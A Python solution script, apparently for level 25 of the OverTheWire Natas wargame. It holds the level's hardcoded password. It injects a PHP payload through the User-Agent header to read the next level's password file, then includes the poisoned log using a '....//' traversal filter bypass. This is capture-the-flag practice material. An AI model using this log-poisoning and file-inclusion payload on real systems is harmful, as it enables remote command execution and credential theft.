# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
import requests

def natas25():
    username="natas25"
    password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

    url = "http://natas25.natas.labs.overthewire.org/"
    session = requests.Session()
    session.headers.update({"User-Agent":'<? echo passthru("cat /etc/natas_webpass/natas26") ?>'})
    response = session.get(url+"?lang=abc", auth=(username, password))
    cookies = session.cookies.get_dict()
    session_id = cookies.get("PHPSESSID")

    response = session.get(url+f"?lang=....//logs/natas25_{session_id}.log", auth=(username, password))

    content = response.content.decode("utf-8")
    password = re.search(r"(?<=] )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))
    
if __name__ == "__main__":
    natas25()
